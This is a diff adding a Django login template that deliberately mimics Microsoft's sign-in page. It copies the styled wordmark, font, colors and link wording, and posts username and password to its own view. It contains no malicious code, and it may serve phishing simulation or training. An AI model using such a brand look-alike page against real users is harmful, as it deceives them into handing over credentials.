@@ -1,0 +1,83 @@
+{% extends 'base.html' %}
+
+{% block title %}Sign in{% endblock %}
+
+{% block content %}
+<div class="min-h-screen bg-white flex items-center justify-center p-4">
+    <div class="max-w-md w-full">
+        <!-- Microsoft-style Logo -->
+        <div class="text-center mb-8">
+            <svg class="mx-auto mb-4" width="108" height="24" viewBox="0 0 108 24">
+                <g fill="#5E5E5E">
+                    <path d="M44.836 4.6v13.8h-2.4V7.583L38.119 18.4h-1.588L32.142 7.583V18.4h-2.4V4.6h2.4l4.704 11.8L41.548 4.6h3.288zm8.712 13.8V4.6h2.4v13.8h-2.4zm7.412-13.8v13.8h-2.4V4.6h2.4zm11.388 13.8L68.412 9.6l-3.936 8.8h-2.628l5.316-11.8-5.04-11.6h2.628l3.768 8.4 3.768-8.4h2.628l-5.04 11.6 5.316 11.8h-2.628zm12.956-13.8v13.8h-2.4V4.6h2.4zm17.324 13.8h-2.4l-5.904-9.516V18.4h-2.4V4.6h2.4l5.904 9.516V4.6h2.4v13.8z"/>
+                </g>
+            </svg>
+        </div>
+
+        <!-- Login Card -->
+        <div class="bg-white shadow-lg border border-gray-200 rounded-sm p-11">
+            <div class="mb-6">
+                <h1 class="text-2xl font-normal text-gray-800 mb-2">Sign in</h1>
+                <p class="text-sm text-gray-600">to continue</p>
+            </div>
+
+            <form method="post" class="space-y-4">
+                {% csrf_token %}
+
+                <div class="form-group">
+                    <input type="text"
+                           id="username"
+                           name="username"
+                           required
+                           placeholder="Username"
+                           class="w-full px-3 py-2 border border-gray-300 text-gray-800 text-base focus:outline-none focus:border-gray-500 hover:border-gray-400 transition-colors">
+                </div>
+
+                <div class="form-group">
+                    <input type="password"
+                           id="password"
+                           name="password"
+                           required
+                           placeholder="Password"
+                           class="w-full px-3 py-2 border border-gray-300 text-gray-800 text-base focus:outline-none focus:border-gray-500 hover:border-gray-400 transition-colors">
+                </div>
+
+                <div class="flex items-center justify-between pt-2">
+                    <div class="flex items-center">
+                        <input type="checkbox" id="remember" class="w-4 h-4 border-gray-300 rounded">
+                        <label for="remember" class="ml-2 text-sm text-gray-700">Keep me signed in</label>
+                    </div>
+                </div>
+
+                <div class="pt-4">
+                    <button type="submit"
+                            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 px-4 transition-colors duration-150">
+                        Next
+                    </button>
+                </div>
+            </form>
+
+            <div class="mt-6 text-center">
+                <a href="#" class="text-sm text-blue-600 hover:underline">Can't access your account?</a>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="mt-6 text-center text-xs text-gray-600 space-x-4">
+            <a href="#" class="hover:underline">Terms of use</a>
+            <a href="#" class="hover:underline">Privacy & cookies</a>
+        </div>
+    </div>
+</div>
+
+<style>
+    body {
+        font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+        outline: 1px solid #0067b8;
+    }
+</style>
+{% endblock %}
